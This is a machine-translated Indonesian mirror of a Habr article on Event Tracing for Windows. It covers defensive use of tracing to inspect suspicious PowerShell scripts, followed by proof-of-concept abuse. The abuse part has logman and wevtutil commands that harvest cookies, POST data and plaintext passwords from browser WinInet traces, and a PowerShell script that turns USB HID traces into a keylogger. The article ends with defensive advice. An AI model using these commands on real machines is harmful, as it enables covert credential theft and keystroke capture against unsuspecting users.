<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏾‍🌾 🤹🏼 🌟 Pelacakan Peristiwa untuk Windows ada di sisi jahat. Tapi itu tidak pasti 🤚🏻 🥥 🕟</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dalam artikel sebelumnya tentang sniffer PowerShell dan mengumpulkan data boot dari server jauh, saya sudah menulis sedikit tentang kemampuan ETW (Eve...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Pelacakan Peristiwa untuk Windows ada di sisi jahat. Tapi itu tidak pasti</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pc-administrator/blog/418787/"><p><img src="https://habrastorage.org/webt/ii/h9/zh/iih9zhmwsn9nofzy8rkouzp4yry.jpeg"></p><br><p>  Dalam artikel sebelumnya tentang <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sniffer PowerShell</a> dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">mengumpulkan data boot dari server jauh,</a> saya sudah menulis sedikit tentang kemampuan ETW (Event Tracing for Windows).  Hari ini saya ingin berbicara lebih banyak tentang teknologi ini. </p><br><p>  Pada saat yang sama, saya akan menunjukkan menggunakan HTTPS dan membuat keylogger di PowerShell sebagai contoh bagaimana hal itu dapat digunakan untuk kebaikan.  Atau tidak benar-benar untuk kebaikan. <a name="habracut"></a></p><br><h1 id="rabota-s-etw">  Bekerja dengan ETW </h1><br><p>  Pelacakan Peristiwa untuk Windows mengumpulkan dan mengirim pesan dari komponen sistem Windows dan aplikasi pihak ketiga.  Itu muncul kembali pada zaman Windows 2000, tetapi jika pada masa itu ada beberapa lusin penyedia sistem, sekarang skor mereka sudah mencapai ratusan.  Pesan mudah digunakan untuk mendiagnosis kesalahan dan menyelesaikan masalah kinerja perangkat lunak. </p><br><p> Beberapa penyedia sistem sudah menulis ke log peristiwa Windows secara default, dan beberapa disertakan secara terpisah.  Jadi, bahkan jika Anda tidak tahu tentang ETW, Anda mungkin menggunakannya.  Anda dapat berkenalan dengan log dan mengaktifkan beberapa dari mereka jika perlu di penampil peristiwa standar dalam log aplikasi dan layanan.  Sedikit tentang majalah dan tentang cara menggunakannya dapat ditemukan di artikel " <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Kami memutar log seperti yang kita inginkan - analisis log dalam sistem Windows</a> ". </p><br><p>  <strong>Anda bisa melihat daftar penyedia</strong> yang ada yang hanya senang memberi tahu kami apa yang terjadi pada mereka dengan perintah <strong>penyedia kueri logman</strong> . </p><br><p><img src="https://habrastorage.org/webt/l1/pj/bk/l1pjbkjfufxvyqp5ro4xv4qjyne.jpeg"></p><br><p>  <em>Penyedia ETW.</em> </p><br><p>  Anda dapat menggunakan <strong>perintah penyedia logman permintaan -pid &lt;proses PID&gt;</strong> untuk melihat daftar penyedia yang terhubung ke proses Windows tertentu (dan, karenanya, pelajari sesuatu tentang itu) <strong>.</strong> </p><br><p><img src="https://habrastorage.org/webt/f2/q3/is/f2q3is7egt-nmq70kkeoijqvrp0.jpeg"></p><br><p>  <em>Daftar penyedia yang terhubung ke notebook biasa.</em> </p><br><p>  <strong>Anda</strong> dapat mengaktifkan <strong>berlangganan acara</strong> penyedia tertentu atau melacak melalui PowerShell menggunakan <strong>cmdlet New-NetEventSession</strong> .  Dan Anda bahkan dapat mengklik dengan mouse di jalur "Manajemen Komputer" - "Kinerja" - "Kelompok pengumpul data."  Di sini, di sesi pelacakan acara, Anda dapat melihat jejak mana yang sedang berjalan, dan Anda dapat membuat kolektor sendiri jika diinginkan. </p><br><p><img src="https://habrastorage.org/webt/gh/bx/qe/ghbxqepwh2ilmzzul7khowlivgo.jpeg"></p><br><p>  <em>Lari jejak.</em> </p><br><p>  <strong>Anda dapat melihat hasilnya</strong> menggunakan utilitas dan set utilitas seperti <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Microsoft Message Analyzer</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Windows Performance Toolkit,</a> atau bahkan <strong>cmdlet</strong> PowerShell <strong>Get-WinEvent</strong> . </p><br><p>  Saya sarankan Anda membaca fitur ETW di dokumentasi Microsoft, Anda bisa mulai dengan bagian <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Tentang Pelacakan Peristiwa</a> .  Saya juga dapat merekomendasikan beberapa materi bagus “ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Kami mempelajari ETW dan mengekstrak laba</a> ”. </p><br><p>  Karena ETW beroperasi pada level kernel, ETW dibedakan oleh kecepatan pengiriman pesan dan tidak adanya kebutuhan untuk menginstal driver apa pun atau menyuntikkan ke dalam aplikasi.  Biasanya, ETW digunakan untuk mendiagnosis masalah kinerja dan aplikasi.  Sebagai contoh, artikel " <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Mempercepat boot Windows untuk kesenangan dan keuntungan</a> " menganalisis faktor-faktor yang mempengaruhi perlambatan pemuatan, dan dalam artikel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">CPU 24-core dan saya tidak bisa menggerakkan mouse saya</a> - alasan untuk memperlambat Windows pada operasi biasa.  Biarkan saya memberi Anda sebuah contoh - PowerDell menjalankan analisis cmdlet. </p><br><h1 id="sledim-za-powershell">  Menonton PowerShell </h1><br><p>  Misalkan dalam beberapa cara (misalnya, melalui audit startup proses), Anda menemukan bahwa proses cadel dan skrip PowerShell sedang berjalan di komputer Anda.  Salah satu teknik adalah menggunakan ETW untuk menganalisis aktivitas mereka.  Misalnya, lihat penyedia PowerShell.  Aktifkan penelusuran dengan perintah: </p><br><pre><code class="bash hljs">logman start pstrace -p Microsoft-Windows-PowerShell -oc:\temp\pstrace.etl -ets</code> </pre> <br><p>  Sekarang mari kita tunggu sampai skrip yang tidak bisa dipahami berhasil, hentikan jejaknya dengan perintah: </p><br><pre> <code class="bash hljs">logman stop pstrace -ets</code> </pre><br><p>  Sekarang Anda dapat melihat jejaknya, misalnya, melalui Microsoft Message Analyzer. </p><br><p><img src="https://habrastorage.org/webt/3i/3j/7u/3i3j7uamctkk9-pd23lmtizdjcs.jpeg"></p><br><p>  <em>Clean.ps1 yang mencurigakan jelas mencari dan menghapus sesuatu.</em> </p><br><p>  Jika Anda memilih garis yang diinginkan, maka di panel bawah akan ada informasi tambahan tentang acara tersebut. </p><br><p><img src="https://habrastorage.org/webt/xk/tx/3t/xktx3thdkpitn0bueqhlaqmfx1k.jpeg"></p><br><p>  <em>Ah, ini skrip yang sama untuk <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">menghapus</a> cache 1C!</em> </p><br><p>  Kali ini semuanya ternyata basi.  Namun dalam kasus yang lebih kompleks, Anda dapat menjalankan penelusuran untuk memeriksa aktivitas lain: </p><br><ul><li>  aktivitas jaringan; </li><li>  Resolusi DNS </li><li>  akses disk; </li><li>  bekerja dengan memori; </li><li>  Aktivitas WMI </li><li>  dan masih banyak lagi. </li></ul><br><p>  Dengan cara ini, ETW dapat membantu menangkap malware dan memahami cara kerja aplikasi.  Di beberapa tempat, ini lebih informatif daripada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Monitor Proses</a> biasa.  Tetapi di samping perbuatan baik, mekanismenya memiliki sisi "gelap". </p><br><blockquote>  Tentu saja, Anda dapat membunuh dengan palu dan menyelamatkan dengan pistol.  Tentu saja, saya tidak akan melakukan penilaian moral atas mekanisme tersebut, tetapi dalam hal apa pun, peluang menarik terbuka. </blockquote><p>  Saya akan memberikan beberapa contoh sebagai Bukti-Konsep </p><br><h1 id="s--znachit-beeezopasno">  S berarti aman </h1><br><p>  Dalam contoh ini, saya akan menunjukkan betapa mudahnya untuk mengetahui apa yang dicari pengguna di Internet, bahkan melalui HTTPS.  Anda dapat melihatnya tanpa PowerShell - hanya mouse, hanya hardcore.  Dalam tugas kami akan ada pengguna, akan ada Windows, Internet Explorer dan log peristiwa. </p><br><p>  Mari kita mulai dengan menyalakan log peristiwa Wininet.  Ini dilakukan sebagai berikut: buka log peristiwa, pada tab "Lihat", aktifkan tampilan log analitik dan debug. </p><br><p><img src="https://habrastorage.org/webt/fu/de/q0/fudeq02mmzhunyyw1cwib0ou8pm.jpeg"></p><br><p>  <em>Tambahkan tampilan log yang diinginkan.</em> </p><br><p>  Setelah itu, aktifkan UsageLog di menu konteks, dan ini cukup untuk mendapatkan informasi yang diperlukan.  Mari gunakan IE dan lihat log: </p><br><p><img src="https://habrastorage.org/webt/pj/mu/ja/pjmujaesudek77i77sv0vtnnnjc.jpeg"></p><br><p>  <em>Majalah WinInet.</em> </p><br><p>  Sebenarnya, di header majalah dan permintaan langsung ke mesin pencari terlihat. </p><br><p>  Selain header, Anda juga dapat menggunakan buku catatan untuk mengeluarkan cookie, dan pada saat yang sama lihat permintaan POST - misalnya, untuk menarik kredensial.  Teknik ini berfungsi pada aplikasi apa pun yang menggunakan wininet.dll untuk bekerja dengan Internet.  Misalnya, browser Edge. </p><br><p>  Hal yang sama mudah diimplementasikan pada PowerShell, dan bahkan pada cmd.  Saya akan memberikan contoh implementasi terakhir. </p><br><p>  Pertama, buat jejak: </p><br><pre> <code class="bash hljs">logman start CookieStealer -p Microsoft-Windows-WinInet -oc:\temp\cookiesteal.etl -ets</code> </pre><br><p>  Sekarang mari kita bekerja di browser, periksa emailnya.  Tracing kemudian dapat dihentikan dengan perintah: </p><br><pre> <code class="bash hljs">logman stop CookieStealer -ets</code> </pre><br><p>  Analisis paling sederhana dapat dilakukan dengan menggunakan utilitas perintah <strong>wevtutil.exe</strong> .  Misalnya, untuk melihat permintaan POST, perintahnya adalah: </p><br><pre> <code class="bash hljs">wevtutil qe c:\temp\cookiesteal.etl /lf:<span class="hljs-literal"><span class="hljs-literal">true</span></span> /f:Text | find /i <span class="hljs-string"><span class="hljs-string">"POST"</span></span></code> </pre><br><p>  Anda bahkan dapat secara acak mencoba mencari kata <em>sandi</em> dan mendapatkan hasilnya. </p><br><p><img src="https://habrastorage.org/webt/yg/yk/gd/ygykgdj9vmqmlp7aobfcz5fyyiu.jpeg"></p><br><p>  <em>Kata sandi dalam teks biasa.</em>  <em>Sangat menyebalkan.</em> </p><br><p>  Perlu dicatat bahwa antivirus itu diam pada saat yang sama.  Memang, ini adalah proses penelusuran normal. </p><br><p>  Tentu saja, acara WinInet juga dapat digunakan untuk mendiagnosis masalah seperti "mengapa situs ini tidak terbuka dan apa yang terjadi sama sekali."  Namun demikian, kemungkinannya cukup menarik.  Saya beralih ke contoh yang lebih bengkok. </p><br><h1 id="keylogger-na-powershell-potomu-chto-mogu">  Keylogger di PowerShell.  Karena saya bisa. </h1><br><p>  Ada dua penyedia ETW yang menarik di Windows: </p><br><ul><li><p>  <strong>Microsoft-Windows-USB-UCX</strong> (36DA592D-E43A-4E28-AF6F-4BC57C5A11E8) - bekerja dengan USB 2.0. </p><br></li><li><p>  <strong>Microsoft-Windows-USB-USBPORT</strong> (C88A4EF5-D048-4013-9408-E04B7DB2814A) - bekerja dengan USB 3.0. </p><br></li></ul><br><p>  Dengan bantuan mereka, Anda bisa mendapatkan data HID yang ditransfer perangkat USB seperti keyboard atau mouse.  Data ditangkap mentah, tetapi berkat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">spesifikasi</a> HID <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">,</a> ia dapat dengan mudah dibaca. </p><br><p>  Untuk mulai melacak, cukup jalankan perintah berikut: </p><br><pre> <code class="bash hljs">logman start <span class="hljs-string"><span class="hljs-string">"usbtrace"</span></span> -p <span class="hljs-string"><span class="hljs-string">"microsoft-windows-usb-usbport"</span></span> -o <span class="hljs-string"><span class="hljs-string">"c:\temp\usbtrace.etl"</span></span> -ets</code> </pre><br><p>  Dan data dapat diperoleh dengan cmdlet PowerShell: </p><br><pre> <code class="hljs mel">$Input=get-winevent –path <span class="hljs-string"><span class="hljs-string">"c:\temp\usbtrace.etl"</span></span> –oldest | where {$_.message –<span class="hljs-keyword"><span class="hljs-keyword">match</span></span> <span class="hljs-string"><span class="hljs-string">"Data"</span></span>}</code> </pre><br><p>  Saya akan memberikan contoh skrip sederhana yang membaca jejak data dan mengubahnya menjadi nilai yang dapat dibaca.  Konversi dilakukan hanya untuk huruf bahasa Inggris dan secara eksklusif dalam huruf kapital. </p><br><div class="spoiler">  <b class="spoiler_title">Daftar lengkap skrip di bawah spoiler.</b> <div class="spoiler_text"><pre> <code class="hljs powershell"><span class="hljs-variable"><span class="hljs-variable">$source</span></span> = <span class="hljs-string"><span class="hljs-string">"C:\temp\trace.etl"</span></span> <span class="hljs-variable"><span class="hljs-variable">$destination</span></span>= <span class="hljs-string"><span class="hljs-string">"C:\temp\Output.txt"</span></span> <span class="hljs-variable"><span class="hljs-variable">$tracetime</span></span> = <span class="hljs-string"><span class="hljs-string">"10"</span></span> logman start usbtrace <span class="hljs-literal"><span class="hljs-literal">-p</span></span> microsoft<span class="hljs-literal"><span class="hljs-literal">-windows</span></span><span class="hljs-literal"><span class="hljs-literal">-usb</span></span><span class="hljs-literal"><span class="hljs-literal">-usbport</span></span> <span class="hljs-literal"><span class="hljs-literal">-o</span></span> <span class="hljs-variable"><span class="hljs-variable">$source</span></span> <span class="hljs-literal"><span class="hljs-literal">-ets</span></span> sleep <span class="hljs-variable"><span class="hljs-variable">$TraceTime</span></span> logman stop usbtrace <span class="hljs-literal"><span class="hljs-literal">-ets</span></span> <span class="hljs-variable"><span class="hljs-variable">$Input</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">get-winevent</span></span> –path <span class="hljs-variable"><span class="hljs-variable">$Source</span></span> –oldest | where {<span class="hljs-variable"><span class="hljs-variable">$_</span></span>.message –match <span class="hljs-string"><span class="hljs-string">"Data"</span></span>} <span class="hljs-variable"><span class="hljs-variable">$HID</span></span> = <span class="hljs-keyword"><span class="hljs-keyword">Foreach</span></span> (<span class="hljs-variable"><span class="hljs-variable">$I</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-variable"><span class="hljs-variable">$Input</span></span>) {(<span class="hljs-string"><span class="hljs-string">'{0:x}'</span></span> <span class="hljs-operator"><span class="hljs-operator">-f</span></span> (<span class="hljs-variable"><span class="hljs-variable">$I</span></span>.properties.value[<span class="hljs-number"><span class="hljs-number">5</span></span>]))} <span class="hljs-variable"><span class="hljs-variable">$Data</span></span>=<span class="hljs-keyword"><span class="hljs-keyword">switch</span></span> (<span class="hljs-variable"><span class="hljs-variable">$HID</span></span>) { <span class="hljs-number"><span class="hljs-number">4</span></span> {<span class="hljs-string"><span class="hljs-string">"A"</span></span>} <span class="hljs-number"><span class="hljs-number">5</span></span> {<span class="hljs-string"><span class="hljs-string">"B"</span></span>} <span class="hljs-number"><span class="hljs-number">6</span></span> {<span class="hljs-string"><span class="hljs-string">"C"</span></span>} <span class="hljs-number"><span class="hljs-number">7</span></span> {<span class="hljs-string"><span class="hljs-string">"D"</span></span>} <span class="hljs-number"><span class="hljs-number">8</span></span> {<span class="hljs-string"><span class="hljs-string">"E"</span></span>} <span class="hljs-number"><span class="hljs-number">9</span></span> {<span class="hljs-string"><span class="hljs-string">"F"</span></span>} A {<span class="hljs-string"><span class="hljs-string">"G"</span></span>} B {<span class="hljs-string"><span class="hljs-string">"H"</span></span>} C {<span class="hljs-string"><span class="hljs-string">"I"</span></span>} D {<span class="hljs-string"><span class="hljs-string">"J"</span></span>} E {<span class="hljs-string"><span class="hljs-string">"K"</span></span>} F {<span class="hljs-string"><span class="hljs-string">"L"</span></span>} <span class="hljs-number"><span class="hljs-number">10</span></span> {<span class="hljs-string"><span class="hljs-string">"M"</span></span>} <span class="hljs-number"><span class="hljs-number">11</span></span> {<span class="hljs-string"><span class="hljs-string">"N"</span></span>} <span class="hljs-number"><span class="hljs-number">12</span></span> {<span class="hljs-string"><span class="hljs-string">"O"</span></span>} <span class="hljs-number"><span class="hljs-number">13</span></span> {<span class="hljs-string"><span class="hljs-string">"P"</span></span>} <span class="hljs-number"><span class="hljs-number">14</span></span> {<span class="hljs-string"><span class="hljs-string">"Q"</span></span>} <span class="hljs-number"><span class="hljs-number">15</span></span> {<span class="hljs-string"><span class="hljs-string">"R"</span></span>} <span class="hljs-number"><span class="hljs-number">16</span></span> {<span class="hljs-string"><span class="hljs-string">"S"</span></span>} <span class="hljs-number"><span class="hljs-number">17</span></span> {<span class="hljs-string"><span class="hljs-string">"T"</span></span>} <span class="hljs-number"><span class="hljs-number">18</span></span> {<span class="hljs-string"><span class="hljs-string">"U"</span></span>} <span class="hljs-number"><span class="hljs-number">19</span></span> {<span class="hljs-string"><span class="hljs-string">"V"</span></span>} <span class="hljs-number"><span class="hljs-number">1</span></span>A {<span class="hljs-string"><span class="hljs-string">"W"</span></span>} <span class="hljs-number"><span class="hljs-number">1</span></span>B {<span class="hljs-string"><span class="hljs-string">"X"</span></span>} <span class="hljs-number"><span class="hljs-number">1</span></span>C {<span class="hljs-string"><span class="hljs-string">"Y"</span></span>} <span class="hljs-number"><span class="hljs-number">1</span></span>D {<span class="hljs-string"><span class="hljs-string">"Z"</span></span>} } <span class="hljs-variable"><span class="hljs-variable">$Data</span></span> | <span class="hljs-built_in"><span class="hljs-built_in">out-file</span></span> <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$Destination</span></span></span><span class="hljs-string">"</span></span> <span class="hljs-built_in"><span class="hljs-built_in">get-content</span></span> <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$Destination</span></span></span><span class="hljs-string">"</span></span> del <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$source</span></span></span><span class="hljs-string">"</span></span> del <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$Destination</span></span></span><span class="hljs-string">"</span></span></code> </pre> </div></div><br><p>  Saat diluncurkan, skrip mengaktifkan jejak selama 10 detik, lalu menunjukkan hasilnya. </p><br><p><img src="https://habrastorage.org/webt/w1/kg/ag/w1kgag36huygrqilju8ngooidx8.jpeg"></p><br><p>  <em>Hasil skrip.</em> </p><br><p>  Tentu saja, setelah memahami data HID, Anda dapat memperbaiki skrip ke keylogger penuh yang akan merekam data dari keyboard dan mouse.  Perlu dicatat keterbatasan mekanisme ini: </p><br><ul><li>  hanya bekerja dengan USB, dan PS \ 2 (seperti yang kadang-kadang ditemukan di laptop) tidak didukung; </li><li>  Dukungan USB 3.0 diumumkan hanya di Windows 8 dan di atasnya; </li><li>  Hak administrator (UAC) diperlukan. </li></ul><br><p>  Tapi tidak ada pengemudi dan pencegat.  Yah, tentu saja, selain penggunaan berbahaya, keylogger seperti itu dapat membantu mendiagnosis masalah dengan keyboard.  Secara teoritis. </p><br><h1 id="nuzhno-li-boyatsya">  Apakah saya perlu takut </h1><br><p>  Bahkan mekanisme built-in di tangan penjahat dapat menyebabkan masalah.  Metode perlindungan tetap sama: memblokir file yang dapat dieksekusi bukan dari direktori sistem, tidak berfungsi sebagai pengguna dengan hak administrator, dan jika mereka berfungsi, setidaknya jangan nonaktifkan UAC.  Dan, tentu saja, browser Windows bawaan dalam hal keamanan menimbulkan pertanyaan. </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id418787/">https://habr.com/ru/post/id418787/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id418777/index.html">"Tidak ada bos di sini": tentang bekerja dengan Open Source dan Apache Ignite di Sberbank Technologies</a></li>
<li><a href="../id418779/index.html">Kasir berdasarkan tablet: mengapa pengecer jaringan membutuhkannya (kami memberi tahu contoh kasir kami)</a></li>
<li><a href="../id418781/index.html">Tambahkan enkripsi email dan tanda tangan elektronik ke Zimbra</a></li>
<li><a href="../id418783/index.html">"Siapa yang kemarin adalah raksasa monopoli, besok mungkin tidak menjadi apa-apa." Wawancara dengan Evgeny Chereshnev dari Biolink.Tech</a></li>
<li><a href="../id418785/index.html">Amigo segalanya. Sekarang sudah resmi</a></li>
<li><a href="../id418789/index.html">Uber berhenti mengembangkan truk tanpa awak</a></li>
<li><a href="../id418791/index.html">Orakel, atau mengapa kontrak pintar masih belum mengubah dunia?</a></li>
<li><a href="../id418793/index.html">Ahli PDU - Tenaga Distribusi Daya</a></li>
<li><a href="../id418795/index.html">Tinjau ASUS ROG GM501 Zephyrus M</a></li>
<li><a href="../id418797/index.html">Kesalahan kidal dari proyek-proyek TI ketika memasuki pasar di AS</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>